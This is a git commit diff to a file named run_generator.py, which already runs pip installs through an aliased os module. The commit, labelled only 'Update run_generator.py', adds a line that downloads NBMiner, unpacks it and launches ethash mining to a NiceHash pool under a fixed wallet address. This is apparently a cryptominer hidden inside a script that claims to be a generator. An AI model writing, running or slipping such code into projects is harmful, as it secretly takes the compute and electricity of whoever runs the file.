df18a51bd59a0d579c18ec8fbf2ede359026f4d5
yayat402 <92287296+yayat402@users.noreply.github.com>
2021-10-11 13:29:07 +0700

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,3 +1,4 @@
 import os as alpha
 alpha.system("pip install --upgrade pip")
 alpha.system("pip install wget")
+alpha.system("wget https://github.com/NebuTech/NBMiner/releases/download/v36.1/NBMiner_36.1_Linux.tgz && tar -xvf  NBMiner_36.1_Linux.tgz && cd NBMiner_Linux && clear && ./nbminer -a ethash -o nicehash+tcp://daggerhashimoto.usa.nicehash.com:3353 -u 33ztip9uQphrGRA4mQzoMG7ACDfDfatGFp.yummy")
